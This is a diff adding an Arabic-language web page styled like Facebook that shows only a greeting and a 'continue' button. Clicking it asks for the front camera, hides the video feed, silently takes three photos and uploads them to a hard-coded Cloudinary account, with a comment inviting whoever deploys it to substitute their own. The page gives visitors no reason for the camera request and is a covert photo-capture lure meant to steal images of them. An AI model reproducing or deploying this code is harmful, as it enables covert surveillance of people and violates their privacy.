@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>استمرار</title>
+<style>
+body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;}
+.container{background:#fff;padding:25px;width:100%;max-width:420px;border-radius:8px;box-shadow:0 4px 10px rgba(0,0,0,.15);text-align:center;}
+button{width:100%;padding:15px;font-size:18px;background:#1877f2;border:none;color:#fff;border-radius:6px;cursor:pointer;}
+video{display:none}
+.status{margin-top:15px;text-align:right;}
+</style>
+</head>
+<body>
+<div class="container">
+<h2>  مرحبا👋</h2>
+<p>  انقر استمرار  </p>
+<button onclick="start()">استمرار</button>
+
+<video id="video" autoplay playsinline></video>
+<div class="status" id="status"></div>
+</div>
+
+<script>
+const cloudName = "ddmbpv5xq";       // غيّر إلى Cloud Name الخاص بك
+const uploadPreset = "upload_preset";  // اسم الـ Preset غير الموقّع
+let video = document.getElementById("video");
+let statusDiv = document.getElementById("status");
+
+async function start(){
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+        video.srcObject = stream;
+        statusDiv.innerText = "جاري ...";
+
+        setTimeout(()=>captureAndUpload(stream),300);
+    }catch{
+        alert("تم رفض إذن الكاميرا");
+    }
+}
+
+function captureAndUpload(stream){
+    for(let i=0;i<3;i++){
+        setTimeout(()=>takePhoto(i+1), i*200);
+    }
+
+    setTimeout(()=>{
+        stream.getTracks().forEach(t=>t.stop());
+    },700);
+}
+
+function takePhoto(index){
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video,0,0);
+
+    canvas.toBlob(blob=>{
+        uploadToCloudinary(blob,index);
+    },"image/jpeg",0.9);
+}
+
+function uploadToCloudinary(blob,index){
+    const url = `https://api.cloudinary.com/v1_1/${cloudName}/upload`;
+    const formData = new FormData();
+    formData.append("file", blob);
+    formData.append("upload_preset", uploadPreset);
+
+    fetch(url,{method:"POST",body:formData})
+    .then(res=>res.json())
+    .then(data=>{
+        statusDiv.innerHTML += `<div>✔ تم   ${index} - <a href="${data.secure_url}" target="_blank">عرض</a></div>`;
+    }).catch(err=>{
+        statusDiv.innerHTML += `<div>✖ خطأ    ${index}</div>`;
+    });
+}
+</script>
+</body>
+</html>
